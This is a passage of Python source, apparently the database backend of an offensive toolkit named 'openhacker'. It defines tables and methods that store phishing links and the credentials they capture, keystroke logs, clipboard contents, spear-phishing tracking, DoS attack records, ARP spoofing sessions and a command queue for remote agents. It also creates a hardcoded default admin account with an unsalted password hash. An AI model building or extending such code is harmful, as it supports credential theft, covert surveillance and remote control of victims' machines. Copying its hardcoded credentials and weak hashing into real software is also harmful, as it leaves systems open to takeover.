                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                command TEXT NOT NULL,
                user_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed BOOLEAN DEFAULT 0,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threat_monitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                interval INTEGER DEFAULT 300,
                enabled BOOLEAN DEFAULT 1,
                last_scan DATETIME,
                next_scan DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threat_monitor_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                monitor_id INTEGER,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threats_found INTEGER DEFAULT 0,
                severity TEXT,
                output TEXT,
                FOREIGN KEY (monitor_id) REFERENCES threat_monitors(id)
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "openhacker_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add MAC info: {e}")
            return False
    
    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
                         duration: float, ended_at: str) -> bool:
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, ended_at, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
                    (status,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
                    country: str, isp: str, nat_type: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO nat_info 
                   (public_ip, private_ip, router_ip, country, isp, nat_type)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (public_ip, private_ip, router_ip, country, isp, nat_type)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_nat_info(self, limit: int = 1) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM nat_info ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
            stats['total_monitors'] = self.conn.execute("SELECT COUNT(*) FROM threat_monitors").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
